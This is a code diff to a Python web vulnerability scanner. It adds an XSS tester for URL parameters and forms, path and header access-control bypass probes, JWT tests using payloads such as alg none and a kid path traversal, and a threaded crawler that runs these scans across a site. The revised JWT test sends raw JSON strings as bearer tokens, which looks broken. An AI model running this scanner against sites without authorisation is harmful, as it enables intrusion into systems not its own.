@@ -108,9 +108,9 @@ BYPASS_HEADERS = {
 }
 
 JWT_PAYLOADS = [
-    {"alg": "none"},
-    {"alg": "HS256", "typ": "JWT"},
-    {"kid": "../../../../dev/null"
+    '{"alg":"none"}',
+    '{"alg":"HS256","typ":"JWT"}',
+    '{"kid":"../../../../dev/null"}'
 ]
 
 SQLI_PAYLOADS = [
@@ -139,10 +139,95 @@ class Scanner:
         self.report_data = []
 
     def scan_xss(self, url, html=None):
-        # ... (original XSS scan code remains) ...
+        parsed = urlparse(url)
+        if not html:
+            try:
+                res = self.session.get(url, timeout=DEFAULT_TIMEOUT)
+                html = res.text
+            except:
+                return
+
+        # Check URL parameters
+        if parsed.query:
+            for param in parse_qs(parsed.query):
+                for payload in XSS_PAYLOADS:
+                    test_url = url.replace(f"{param}=", f"{param}={payload}")
+                    try:
+                        res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
+                        if payload in res.text:
+                            self.results.append({
+                                "type": "XSS",
+                                "url": test_url,
+                                "payload": payload,
+                                "parameter": param,
+                                "confidence": "High"
+                            })
+                            UI.display_vuln(self.results[-1])
+                    except:
+                        continue
+
+        # Check forms
+        soup = BeautifulSoup(html, 'html.parser')
+        for form in soup.find_all('form'):
+            try:
+                action = form.get('action') or url
+                method = form.get('method', 'get').lower()
+                inputs = {i.get('name'): i.get('value', '') for i in form.find_all(['input', 'textarea'])}
+                
+                for payload in XSS_PAYLOADS:
+                    data = {k: payload for k in inputs}
+                    if method == 'post':
+                        res = self.session.post(action, data=data, timeout=DEFAULT_TIMEOUT)
+                    else:
+                        res = self.session.get(action, params=data, timeout=DEFAULT_TIMEOUT)
+                    
+                    if payload in res.text:
+                        self.results.append({
+                            "type": "XSS",
+                            "url": action,
+                            "payload": payload,
+                            "confidence": "Medium"
+                        })
+                        UI.display_vuln(self.results[-1])
+            except:
+                continue
 
     def scan_bypass(self, url):
-        # ... (original bypass scan code remains) ...
+        # Test path bypasses
+        for payload in BYPASS_PAYLOADS:
+            test_url = urljoin(url, payload)
+            try:
+                res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
+                if res.status_code == 200:
+                    self.results.append({
+                        "type": "Bypass",
+                        "url": test_url,
+                        "payload": payload,
+                        "location": "Path",
+                        "status": res.status_code,
+                        "confidence": "Medium"
+                    })
+                    UI.display_vuln(self.results[-1])
+            except:
+                continue
+
+        # Test header bypasses
+        for header, value in BYPASS_HEADERS.items():
+            try:
+                headers = {header: value}
+                res = self.session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT)
+                if res.status_code == 200:
+                    self.results.append({
+                        "type": "Bypass",
+                        "url": url,
+                        "payload": f"{header}: {value}",
+                        "location": "Header",
+                        "status": res.status_code,
+                        "confidence": "Medium"
+                    })
+                    UI.display_vuln(self.results[-1])
+            except:
+                continue
 
     def scan_jwt(self, url):
         """Check for JWT vulnerabilities (CVE-2020-28052, etc.)"""
@@ -152,14 +237,13 @@ class Scanner:
                 jwt_token = res.headers["Authorization"].split(" ")[1]
                 for payload in JWT_PAYLOADS:
                     try:
-                        modified_token = self.modify_jwt(jwt_token, payload)
-                        headers = {"Authorization": f"Bearer {modified_token}"}
+                        headers = {"Authorization": f"Bearer {payload}"}
                         res = self.session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT)
                         if res.status_code == 200:
                             self.results.append({
                                 "type": "JWT Bypass",
                                 "url": url,
-                                "payload": str(payload),
+                                "payload": payload,
                                 "confidence": "High"
                             })
                             UI.display_vuln(self.results[-1])
@@ -224,10 +308,32 @@ class Scanner:
         UI.status(f"Report saved to: {report_path}", "success")
 
     def crawl(self, url, depth=3, threads=10):
-        # ... (original crawl code enhanced with new scans) ...
-        self.scan_jwt(url)
-        self.scan_sqli(url)
-        self.scan_lfi(url)
+        if depth <= 0 or self.stop_event.is_set():
+            return
+
+        try:
+            res = self.session.get(url, timeout=DEFAULT_TIMEOUT)
+            
+            # Scan current page
+            self.scan_xss(url, res.text)
+            self.scan_bypass(url)
+            self.scan_jwt(url)
+            self.scan_sqli(url)
+            self.scan_lfi(url)
+            
+            # Extract and crawl links
+            soup = BeautifulSoup(res.text, 'html.parser')
+            links = {urljoin(url, a['href']) for a in soup.find_all('a', href=True) 
+                    if urlparse(urljoin(url, a['href'])).netloc == urlparse(url).netloc}
+            
+            with ThreadPoolExecutor(max_workers=threads) as executor:
+                for link in links:
+                    if link not in self.visited:
+                        self.visited.add(link)
+                        executor.submit(self.crawl, link, depth-1, threads)
+                        
+        except Exception as e:
+            UI.status(f"Error scanning {url}: {str(e)}", "error")
 
 # ========== 🚀 MAIN EXECUTION ==========
 if __name__ == "__main__":
